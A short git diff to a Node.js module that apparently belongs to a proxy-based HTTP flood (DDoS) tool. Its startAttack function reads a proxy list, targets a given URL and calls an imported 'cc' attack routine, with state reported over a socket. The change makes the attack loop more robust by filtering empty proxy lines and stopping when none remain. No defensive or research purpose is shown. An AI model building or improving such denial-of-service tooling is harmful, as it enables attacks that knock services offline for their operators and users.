@@ -1,6 +1,6 @@
 const { cc, post, head, ParseUrl } = require('./main');
 const fs = require('fs');
-const nodePath = require('path'); 
+const nodePath = require('path');
 
 let attackInProgress = false;
 let attackInterval;
@@ -10,7 +10,13 @@ const startAttack = (url, time, socket) => {
   attackInProgress = true;
 
   ParseUrl(url);
-  const proxies = fs.readFileSync(nodePath.join(__dirname, 'proxy.txt'), 'utf8').split('\n');
+
+  const proxies = fs.readFileSync(nodePath.join(__dirname, 'proxy.txt'), 'utf8').split('\n').filter(line => line.trim());
+
+  if (proxies.length === 0) {
+    socket.emit('attackStopped', 'No proxies available');
+    return;
+  }
 
   cc({ wait: () => {}, set: () => {} }, 5);
 
